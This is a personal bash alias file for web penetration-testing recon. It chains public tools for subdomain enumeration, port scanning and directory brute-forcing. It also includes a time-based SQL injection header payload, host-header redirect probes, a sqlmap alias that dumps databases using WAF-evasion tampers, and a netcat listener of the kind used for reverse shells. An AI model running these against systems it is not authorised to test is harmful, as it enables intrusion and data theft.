# reloads aliases in current terminal without the need to close and start a new
reload(){
	source ~/.bash_aliases
	echo ".bash_aliases reloaded"
}

# para descargar la ultima version de .bash_aliases y commonwords
reinstall(){
	echo -e "\e[32m"
	cd ~/
	mkdir -p ~/tools/{__diccionarios,recon}
	git clone https://github.com/estebancano-dev/BashAliases.git
	cp ~/BashAliases/.bash_aliases ~/
	rm -R ~/BashAliases 
	git clone https://github.com/estebancano-dev/commonwords.git
	cp ~/commonwords/*.* ~/tools/__diccionarios
	rm -R ~/commonwords 
	reload
	echo -e "\033[0m"
}

# scans for js files with https://github.com/ffuf/ffuf on a list of urls in a file
# usage: scanjs file.txt
# output: urls found with 200 http responses
scanjs(){
	now=$(date +"%Y%m%d%H%M%S")
	echo "Scanjs started $now. Log file: scanjs_$now.txt" | tee -a scanjs_$now.txt
	cat $1 | while read line; do 
		FILENAME=$line
		FUZZ="FUZZ"
		EXT=".js"
		echo "Scanning...$FILENAME$FUZZ$EXT" | tee -a scanjs_$now.txt
		echo "Wordlist 1.txt..." | tee -a scanjs_$now.txt
		SECONDS=0
		ffuf -u "$FILENAME$FUZZ$EXT" -s -c -mc "200" -w ~/tools/__diccionarios/1.txt | tee -a scanjs_$now.txt
		echo "Finished in $SECONDS seconds" | tee -a scanjs_$now.txt
		echo "Wordlist 2.txt..." | tee -a scanjs_$now.txt
		SECONDS=0
		ffuf -u "$FILENAME$FUZZ$EXT" -s -c -mc "200" -w ~/tools/__diccionarios/2.txt | tee -a scanjs_$now.txt
		echo "Finished in $SECONDS seconds" | tee -a scanjs_$now.txt
		echo "Wordlist 3.txt..." | tee -a scanjs_$now.txt
		SECONDS=0
		ffuf -u "$FILENAME$FUZZ$EXT" -s -c -mc "200" -w ~/tools/__diccionarios/3.txt | tee -a scanjs_$now.txt
		echo "Finished in $SECONDS seconds" | tee -a scanjs_$now.txt
	done
}

# scans for subdomains files with https://github.com/ffuf/ffuf on a list of urls in a file
# usage: scansub file.txt
# output: urls found with XXX http responses
scansub(){
	now=$(date +"%Y%m%d%H%M%S")
	h="http://FUZZ."
	http="http://"
	https="https://"
	echo "Scansub started $now. Log file: scansub_$now.txt" | tee -a scansub_$now.txt
	cat $1 | while read line; do
		if [ ${line:0:8} = "https://" ]; then
		    h="https://FUZZ."
		fi 
		foo=${line/$http/}
		foo=${line/$https/}
		echo "curl -s -H \"Host: nonexistent.$foo\" $line |wc -c"
		length=$(curl -s -H \"Host: nonexistent.$foo\" $line |wc -c)
		echo "ffuf -u \"$h$foo\" -s -c -w ~/tools/__diccionarios/1y4.txt -fs $length | tee -a scansub_$now.txt"
		#echo "Scanning...$line" | tee -a scansub_$now.txt
		#echo "Wordlist 1y4.txt..." | tee -a scansub_$now.txt
		#SECONDS=0
		#ffuf -u "$h$foo" -s -c -w ~/tools/__diccionarios/1y4.txt -fs $length | tee -a scansub_$now.txt
		#echo "Finished in $SECONDS seconds" | tee -a scansub_$now.txt
		#echo "Wordlist 3y2.txt..." | tee -a scansub_$now.txt
		#SECONDS=0
		#ffuf -u "$h$foo" -s -c -w ~/tools/__diccionarios/3y2.txt | tee -a scansub_$now.txt
		#echo "Finished in $SECONDS seconds" | tee -a scansub_$now.txt
	done
}

# creates a new file with unique and ordered lines from source file 
# usage: uniquelines file.txt
# output: fileunique.txt
uniquelines(){
	FILENAME=$1
	NEWFILENAME="${FILENAME%%.*}unique.${FILENAME#*.}"
	totallines=$(wc -l $FILENAME | awk '{ print $1 }')
	sort -u $FILENAME > $NEWFILENAME
	totalnewlines=$(wc -l $NEWFILENAME | awk '{ print $1 }')
	total=$((totallines - totalnewlines))
	echo "$total from $totallines duplicated lines deleted. File created: $NEWFILENAME"
}

# creates a new file with email accounts found in source file
# usage: grepemails file.txt
# output: fileemails.txt
grepemails(){
	FILENAME=$1
	grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $1 > "${FILENAME%%.*}emails.txt"
	echo "File created: ${FILENAME%%.*}emails.txt"
}

linkfinder(){
	cd ~/tools/LinkFinder
	python3 linkfinder.py -i $1 -d -o cli
}

ipinfo(){
	curl http://ipinfo.io/$1
}

check(){
	assetfinder $1 | grep $1 | httprobe
}

# Given a domain name, and optionally an ASN number (only 1 number, eg:62566) scans for subdomains, tries to resolve them, shows web services, check for alive ones and makes portscan
# Uses: assetfinder, subfinder, sublist3r, amass, massdns, httprobe, nmap, masscan
# usage: subdomains domain.com [ASNNUMBER]
# output: list of alive subdomains, open ports, vulns
# TODO: remove private ips from 4nmapips.
#		
subdomains(){
	clear
	begin=$(date +"%s")
	now=$(date +"%Y%m%d%H%M")
	mkdir -p ~/tools/recon/$1/$now/
	cd ~/tools/recon/$1/$now/
	touch 1scrap1$1.txt 1scrap2$1.txt 1scrap3$1.txt 1scrap4$1.txt

	echo -e "\e[32mUrl: $1 $2\033[0m"
	echo -e "\e[32m************ Starting Scrapping... ************\033[0m"
	echo -e "\e[32mDoing Assetfinder...\033[0m"
	assetfinder $1 > 1scrap1$1.txt	
	
	echo -e "\e[32mDoing Subfinder...\033[0m"
	#subfinder -t 100 -d $1 -silent -o 1scrap2$1.txt > /dev/null 2>&1
	
	echo -e "\e[32mDoing Sublist3r...\033[0m"
	#python ~/tools/Sublist3r/sublist3r.py -d $1 -o 1scrap3$1.txt > /dev/null 2>&1
	
	echo -e "\e[32mDoing Amass...\033[0m"
	#amass enum -active -d $1 -o 1scrap4$1.txt > /dev/null 2>&1
	
	# junto los resultados, quito dominios que no sirven (si busco *.google.com a veces aparece ihategoogle.com, y no es parte del scope)
	cat 1scrap1$1.txt 1scrap2$1.txt 1scrap3$1.txt 1scrap4$1.txt | grep "\.$1\|^$1" > 1scrap$1.txt
	# borro los archivos temporales
	rm -f 1scrap1$1.txt 1scrap2$1.txt 1scrap3$1.txt 1scrap4$1.txt
	# borro <BR> de la salida del Sublist3r, a veces pasa
	sed -i 's/<BR>/\r\n/g' 1scrap$1.txt
	# los ordeno y quito dominios duplicados
	sort -u -o 1scrap$1.txt 1scrap$1.txt 

	if [[ -f 1scrap$1.txt && ! -s 1scrap$1.txt ]]; then
		echo -e "\e[32m*********** No domains scrapped... ************\033[0m"
		echo -e "\e[32m***********************************************\033[0m"
		return
	fi

	# altdns con los dominios en bruto.
	#cat 6httprobe$1.txt |sed -e 's/https:\/\///g' | sed -e 's/http:\/\///g' | sort -u > altdns$1.txt
	echo -e "\e[32mDoing Altdns to generate alternative domains...\033[0m"
	altdns -i 1scrap$1.txt -o altdns$1.txt -w ~/tools/__diccionarios/altdns.txt
	cat altdns$1.txt | sort -u >> altdns$1.txt
	# de la lista de alternativos (son aquellos no listados/ocultos, hay mas chances de que no estén testeados), quito los originales
	cat 1scrap$1.txt | while read dom; do
		sed -i "/^$dom/d" altdns$1.txt
	done
	count=$(cat "altdns$1.txt" | wc -l)
	echo -e "\e[32mGenerated $count alternative domains...\033[0m"
	
	echo -e "\e[32m************** Scrapping done... **************\033[0m"
	echo -e "\e[32m********** Starting DNS Resolving... **********\033[0m"
	echo -e "\e[32mDoing Massdns to scrapped domains...\033[0m"
	massdns -q -r ~/tools/massdns/lists/resolvers.txt -w 2massdns$1.txt 1scrap$1.txt
	# resuelvo los dominios alternativos
	if [[ -f altdns$1.txt && -s altdns$1.txt ]]; then
		echo -e "\e[32mDoing Massdns to alternative domains...\033[0m"
		massdns -q -o S -r ~/tools/massdns/lists/resolvers.txt -w altdnsresolved$1.txt altdns$1.txt
	fi
	massdns -q -o S -r ~/tools/massdns/lists/resolvers.txt -w 8massdnssimple$1.txt 1scrap$1.txt
	
	if [[ -f 2massdns$1.txt && ! -s 2massdns$1.txt ]]; then
		echo -e "\e[32m*********** No domains resolved... ************\033[0m"
		echo -e "\e[32m***********************************************\033[0m"
		return
	fi
	echo -e "\e[32m************ DNS Resolving done... ************\033[0m"
	
	return
	
	echo -e "\e[32m********** Starting Alive Checking... *********\033[0m"
	echo -e "\e[32mDoing httprobe...\033[0m"
	cat 1scrap$1.txt | httprobe > 6httprobe$1.txt	
	# paso los dominios alternativos al general para chequear si estan vivos
	# lo hago despues del httprobe, sino me hace httprobe de todos los alternativos y no me interesa
	cat altdns$1.txt >> 1scrap$1.txt
	rm altdns$1.txt
	echo -e "\e[32mDoing Nmap to check if alive...\033[0m"
	nmap -sP -T5 -iL 1scrap$1.txt > 3nmap$1.txt < /dev/null 2>&1
	
	# agrego a la lista de IP los rangos ASN (si se agregó el segundo parámetro)
	re='^[0-9]+$'
	if [[ $2 =~ $re ]]; then
		echo -e "\e[32mDoing Nmap to check ASN alive IP...\033[0m"
		nmap -Pn --script targets-asn --script-args targets-asn.asn=$2 --min-rate=3000 | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" > asnip$1.txt < /dev/null 2>&1
		nmap -sP -T5 --min-rate=3000 -iL asnip$1.txt >> 3nmap$1.txt < /dev/null 2>&1
	fi

	# extract all ips and order/unique them
	cat 3nmap$1.txt | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u > 4nmapips$1.txt
	
	# vuelo ip privadas, 0.0.0.0 (a veces aparece y el scan tarda mucho) y lineas en blanco. https://en.wikipedia.org/wiki/Private_network
	sed -i -E '/192\.168|10\.|172\.1[6789]\.|172\.2[0-9]\.|172\.3[01]\.|127.0.0.1|0.0.0.0|100\.[6789]|100\.1[01][0-9]\.|100\.12[0-7]\.|^$/d' 4nmapips$1.txt
	
	# cuento la cantidad de alive hosts y la cantidad de IP únicas encontradas
	count=$(grep -c "Host is up" 3nmap$1.txt)
	ips=$(wc -l 4nmapips$1.txt | awk '{ print $1 }')
	echo -e "\e[32m$count domains pointing to $ips IP addresses\033[0m"
	echo -e "\e[32m************ Alive Checking done... ***********\033[0m"
	
	#touch 9httprobeXORsqli$1.txt ahttproberedirect$1.txt
	# existen http o https accesibles, chequeo sqli y redirects
	#if [[ -f 6httprobe$1.txt && -s 6httprobe$1.txt ]]; then
	#	echo -e "\e[32m********** Starting Headers Check... *********\033[0m"
	#	echo -e "\e[32mDoing Curl to check headers for sqli/redirect...\033[0m"
	#	checkheadersforsqli 6httprobe$1.txt 9httprobeXORsqli$1.txt & checkheadersforredirect 6httprobe$1.txt ahttproberedirect$1.txt
	#	echo -e "\e[32m************ Headers Check done... ***********\033[0m"
	#fi
	
	echo -e "\e[32m********** Starting Port scanning... **********\033[0m"
	echo -e "\e[32mDoing Masscan...\033[0m"
	masscan -p0-65535 -iL 4nmapips$1.txt -oG 5masscan$1.txt --max-rate 30000 > /dev/null 2>&1

	if [[ -f 4nmapips$1.txt && -s 4nmapips$1.txt ]]; then
		echo -e "\e[32mDoing Nmap to check port service versions...\033[0m"
		touch 7nmapservices$1.txt
		cat 4nmapips$1.txt | while read ipaescanear; do
			ports=$(nmap -Pn -p- --min-rate=30000 -T4 $ipaescanear | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
			length=$(echo $ports | sed 's/[^,]//g' | awk '{ print length }')
			# escaneo hasta 30 puertos, a veces el nmap detecta (de cloudflare x ejemplo) cientos de puertos abiertos, y es mentira
			if (($length <= 30)); then
				# -sC es más rapido que -sV. Si necesito más info, escanear a mano con -sV --script=vuln x ejemplo
				nmap -Pn -sC -f -p$ports -T5 $ipaescanear >> 7nmapservices$1.txt < /dev/null 2>&1
			fi
		done
	fi
	
	echo -e "\e[32m************* Port scanning done... ***********\033[0m"
	echo -e "\e[32m***************** Screenshots... **************\033[0m"
	echo -e "\e[32mDoing EyeWitness to httprobe results...\033[0m"
	python3 ~/tools/EyeWitness/EyeWitness.py -f 6httprobe$1.txt -d ./EyeWitness > /dev/null 2>&1
	
	echo -e "\e[32m******************** The End *******************\033[0m"
	end=$(date +"%s")
	diff=$(($end-$begin))
	echo "$(($diff / 60))m $(($diff % 60))s elapsed."
}

# Gets an url with curl and adds every header to check for potential sqli injections (if response time > 6 seconds)
# usage: checkheadersforsqli urllist.txt outputheaderswithsqli.txt
# output: list of urls and headers with potential sqli
checkheadersforsqli(){
	if [[ -f $1 && ! -s $1 ]]; then
		echo -e "\e[32mUrls file is empty!\033[0m"
		return
	fi
	if [[ -f ~/tools/__diccionarios/headers.txt && ! -s ~/tools/__diccionarios/headers.txt ]]; then
		echo -e "\e[32mNo headers file found!\033[0m"
		return
	fi
	touch $2
	cat $1 | while read url; do
		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
		if [[ $url =~ $regex ]]; then 
			cat ~/tools/__diccionarios/headers.txt | while read head; do
				response=$(curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "%{time_starttransfer}" --max-redirs 10 --connect-timeout 15 --max-time 15 $url)
				time=$(echo "$response" | tail -1 | awk -F  "." '{print $1}')
				if [[ $time =~ '^[0-9]+$' ]]; then
					if (($time >= 6)); then
						echo "\r\n*** URL: $url - Header: $head\r\n" >> $2
						echo "$response" >> $2
					fi
				fi
			done
		fi
	done
}

# Gets an url with curl and adds every header to check for sqli injections (if response time > 6 seconds)
# usage: checkheadersforredirect urllist.txt outputurlswithredirection.txt
# output: list of urls and headers with redirection
checkheadersforredirect(){
	if [[ -f $1 && ! -s $1 ]]; then
		echo -e "\e[32mUrls file is empty!\033[0m"
		return
	fi
	touch $2
	cat $1 | while read url; do
		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
		if [[ $url =~ $regex ]]; then 
			response=$(curl -X GET -H "X-Forwarded-For: estebancano.com.ar/abc.php" -s -L --max-redirs 10 --connect-timeout 15 --max-time 15 $url)
			if [[ $response == *"<-- CHECK -->"* ]]; then
				echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php" >> $2
			fi
			response=$(curl -X GET -H "X-Forwarded-Host: estebancano.com.ar/abc.php" -s -L --max-redirs 10 --connect-timeout 15 --max-time 15 $url)
			if [[ $response == *"<-- CHECK -->"* ]]; then
				echo "\r\n*** URL: $url - Header: X-Forwarded-Host: estebancano.com.ar/abc.php" >> $2
			fi
		fi
	done
}

# Find all 1scrap*.txt in recon directory, merges them and check for CNAME records
# usage: takeover [word]
# output: list of domains with CNAME records for 1scrap*word*.txt (eg: 1scrap*starbucks*.txt), to manually check for subdomains takeover
takeover(){
	now=$(date +"%Y%m%d%H%M")
	find ~/tools/recon -type f -name "1scrap*$1*.txt" -exec cat {} + > ~/tools/takeovers/1scrapall$now.txt
	if [[ -f ~/tools/takeovers/1scrapall$now.txt && ! -s ~/tools/takeovers/1scrapall$now.txt ]]; then
		echo -e "\e[32mUrls file is empty!\033[0m"
		return
	fi
	sort -u -o ~/tools/takeovers/1scrapall$now.txt ~/tools/takeovers/1scrapall$now.txt
	massdns -q -o S -r ~/tools/massdns/lists/resolvers.txt -t CNAME --verify-ip -w ~/tools/takeovers/takeover$now.txt ~/tools/takeovers/1scrapall$now.txt
	cat ~/tools/takeovers/takeover$now.txt | awk '{ print $3 }' > ~/tools/takeovers/takeover2$now.txt
	sort -u -o ~/tools/takeovers/takeover2$now.txt ~/tools/takeovers/takeover2$now.txt
	massdns -q -r ~/tools/massdns/lists/resolvers.txt -w ~/tools/takeovers/takeover3$now.txt ~/tools/takeovers/takeover2$now.txt
}

getips(){
	cat $1 | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u > $1ips.txt
}

checkwebalive(){
	nmap -sn -Pn $1 --script hostmap-crtsh | awk '{ print $2 }' | grep $1 | check $1
}

dirsearch(){
	PS3='Please enter your choice: '
	options=("no ext" "no ext dicc" "no ext file" "all ext" "js" "php" "js dicc 1-4" "custom ext" "custom ext dicc 1-5" "Quit")
	select opt in "${options[@]}"
	do
		case $opt in
			"no ext")
				python3 ~/tools/dirsearch/dirsearch.py -t 50 --random-agents -x 301,302,400 -f -u $1 -e ,
				break
				;;
			"no ext dicc")
				python3 ~/tools/dirsearch/dirsearch.py -t 50 --random-agents -x 301,302,400 -f -u $1 -e , -w ~/tools/__diccionarios/commonwords.txt
				break
				;;
			"no ext file")
				python3 ~/tools/dirsearch/dirsearch.py -t 50 --random-agents -x 301,302,400 --plain-text-report=SIMPLEOUTPUTFILE -f -L $1 -e , > $1dirsearch.txt
				break
				;;
			"all ext")
				python3 ~/tools/dirsearch/dirsearch.py -t 50 --random-agents -x 301,302,400 -f -u $1 -e ,json,js,html,htm,html~,htm~,bck,bck~,tmp,_js,js~,_tmp,tmp~,asp,aspx,inc.php,php,php~,txt,txt~,pl,jsp,jsp~,py,rb,cfg,cfg~,zip,zip~,pdf,gz,gz~,tar,tar~,tar.gz,tar.gz~,tgz,doc,doc~,docx,xls,xlsx,conf,conf~,do,action -w ~/tools/__diccionarios/commonwords.txt
				break
				;;
			"js")
				python3 ~/tools/dirsearch/dirsearch.py -t 50 --random-agents -x 301,302,400 -f -u $1 -e js,js~ -w ~/tools/__diccionarios/commonwords.txt
				break
				;;
			"php")
				python3 ~/tools/dirsearch/dirsearch.py -t 50 --random-agents -x 301,302,400 -f -u $1 -e php,inc.php,php~ -w ~/tools/__diccionarios/commonwords.txt
				break
				;;
			"js dicc 1-4")
				python3 ~/tools/dirsearch/dirsearch.py -t 50 --random-agents -x 301,302,400 -f -u $1 -e js -w ~/tools/__diccionarios/1-4.txt
				break
				;;
			"custom ext")
				python3 ~/tools/dirsearch/dirsearch.py -t 50 --random-agents -x 301,302,400 -f -u $1 -e $2 -w ~/tools/__diccionarios/commonwords.txt
				break
				;;
			"custom ext dicc 1-5")
				python3 ~/tools/dirsearch/dirsearch.py -t 50 --random-agents -x 301,302,400 -f -u $1 -e $2 -w ~/tools/__diccionarios/1-5.txt
				break
				;;
			"Quit")
				break
				;;
			*) echo "invalid option $REPLY";;
		esac
	done
}

nmap2(){
	PS3='Please enter your choice: '
	options=("alive" "fast" "web vulns" "all ports" "Quit")
	select opt in "${options[@]}"
	do
		case $opt in
			"alive")
				nmap -sP -Pn -T5 $1
				break
				;;
			"fast")
				nmap -sS -Pn -T5 -F $1
				break
				;;
			"web vulns")
				nmap -sS -Pn -T5 -p80,443 --script "vuln" $1
				break
				;;
			"all ports")
				nmap -sS -Pn -T5 -p- --host-timeout 60m $1
				break
				;;
			"Quit")
				break
				;;
			*) echo "invalid option $REPLY";;
		esac
	done
}

sqlmap(){
	cd ~/tools/sqlmap-dev
	python3 sqlmap.py -u $1 --level=5 --risk=3 --threads=10 --dump --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
}

netcat(){
	nc -lvnp 3333
}

#para instalar todas las aplicaciones que utilizo
install(){
	cd ~
	mkdir -p tools/{__diccionarios,recon,takeovers}

	# golang
	cd /usr/local/
	mkdir go
	wget https://dl.google.com/go/go1.14.linux-amd64.tar.gz
	tar -C /usr/local -xzf go1.14.linux-amd64.tar.gz
	export GOROOT=/usr/local/go
	export GOPATH=$HOME/go
	export PATH=$PATH:$GOPATH/bin:$GOROOT/bin
	
	# actualizo el SO
	cd ~/tools
	sudo apt update && sudo apt dist-upgrade -y
	
	# git, nmap, curl, pip3
	sudo apt-get install git -y
	sudo apt-get install nmap -y
	sudo apt-get install curl -y
	sudo apt-get install python3-pip -y
	
	# dirsearch, EyeWitness
	git clone https://github.com/maurosoria/dirsearch.git
	git clone https://github.com/FortyNorthSecurity/EyeWitness.git
	cd EyeWitness/setup
	./setup.sh
	cd ..
	cd ..
	
	# altdns https://github.com/infosec-au/altdns
	curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
	python get-pip.py
	pip install py-altdns
	
	# massdns
	git clone https://github.com/blechschmidt/massdns.git
	cd massdns
	sudo make
	cp bin/massdns /bin/
	cd ..

	# Sublist3r
	git clone https://github.com/aboul3la/Sublist3r.git
	cd Sublist3r
	pip3 install -r requirements.txt
	cd ..
	
	# sqlmap
	git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
	
	
	#git clone https://github.com/GerbenJavado/LinkFinder.git
	#cd LinkFinder
	#python setup.py install
	#cd ..
	
	# masscan
	sudo apt-get install git gcc make libpcap-dev
	git clone https://github.com/robertdavidgraham/masscan
	cd masscan
	make
	cp bin/masscan /bin/
	cd ..
	
	# httprobe, assetfinder, fuff, amass, subfinder
	go get -u github.com/tomnomnom/httprobe
	go get -u github.com/tomnomnom/assetfinder
	go get -u github.com/ffuf/ffuf
	export GO111MODULE=on
	go get -u github.com/OWASP/Amass/v3/...
	go get -u github.com/projectdiscovery/subfinder/cmd/subfinder
	
	# jtr
	git clone https://github.com/magnumripper/JohnTheRipper.git
	apt-get install libssl-dev
	cd JohnTheRipper
	./configure && make
	cd ..
	
	# desktop & vncserver
	sudo apt install xfce4 xfce4-goodies
	sudo apt install tightvncserver
	#ejecutar vncserver para configurar password
	vncserver
	
	reinstall
	sudo apt autoremove
	sudo apt-get clean
	sudo apt-get autoclean
}

export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin:$GOROOT/bin